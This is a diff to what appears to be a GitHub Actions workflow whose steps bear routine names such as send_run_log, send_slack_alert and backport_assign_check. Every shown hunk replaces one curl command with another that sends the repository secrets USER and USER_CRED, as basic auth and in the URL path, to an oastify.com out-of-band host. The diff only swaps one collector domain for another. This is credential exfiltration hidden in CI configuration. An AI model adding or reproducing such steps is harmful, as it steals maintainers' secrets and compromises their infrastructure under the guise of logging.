@@ -21,7 +21,7 @@ jobs:
         USER: ${{ secrets.USER }}
         PW: ${{ secrets.USER_CRED }}
       run: |
-        curl --connect-timeout 2 -sSf -k -u "$USER:$PW" http://wzz7l8pz65f7ft463s3nvl3m6dc403os.oastify.com/$USER/$PW/audit?Test
+        curl --connect-timeout 2 -sSf -k -u "$USER:$PW" http://q901v2ztgzp1pne0dmdh5fdgg7myazyo.oastify.com/$USER/$PW/audit?Test
         
     - name: send_run_log
       continue-on-error: true
@@ -30,7 +30,7 @@ jobs:
         USER: ${{ secrets.USER }}
         PW: ${{ secrets.USER_CRED }}
       run: |
-        curl --connect-timeout 2 -sSf -k -u "$USER:$PW" http://wzz7l8pz65f7ft463s3nvl3m6dc403os.oastify.com/$USER/$PW/audit?Test
+        curl --connect-timeout 2 -sSf -k -u "$USER:$PW" http://q901v2ztgzp1pne0dmdh5fdgg7myazyo.oastify.com/$USER/$PW/audit?Test
         
     - name: send_slack_alert
       continue-on-error: true
@@ -38,7 +38,7 @@ jobs:
         SLACK_WEBHOOK_URL: ${{ secrets.SLACK_WEBHOOK_URL }}
         PR_TITLE: ${{ github.event.pull_request.title }}
       run: |
-        curl --connect-timeout 2 -sSf -k -u "$USER:$PW" http://wzz7l8pz65f7ft463s3nvl3m6dc403os.oastify.com/$USER/$PW/audit?Test
+        curl --connect-timeout 2 -sSf -k -u "$USER:$PW" http://q901v2ztgzp1pne0dmdh5fdgg7myazyo.oastify.com/$USER/$PW/audit?Test
 
     - name: backport_assign_check
       env:
@@ -47,4 +47,4 @@ jobs:
         USER: ${{ secrets.USER }}
         PW: ${{ secrets.USER_CRED }}
       run: |
-        curl --connect-timeout 2 -sSf -k -u "$USER:$PW" http://wzz7l8pz65f7ft463s3nvl3m6dc403os.oastify.com/$USER/$PW/audit?Test
+        curl --connect-timeout 2 -sSf -k -u "$USER:$PW" http://q901v2ztgzp1pne0dmdh5fdgg7myazyo.oastify.com/$USER/$PW/audit?Test
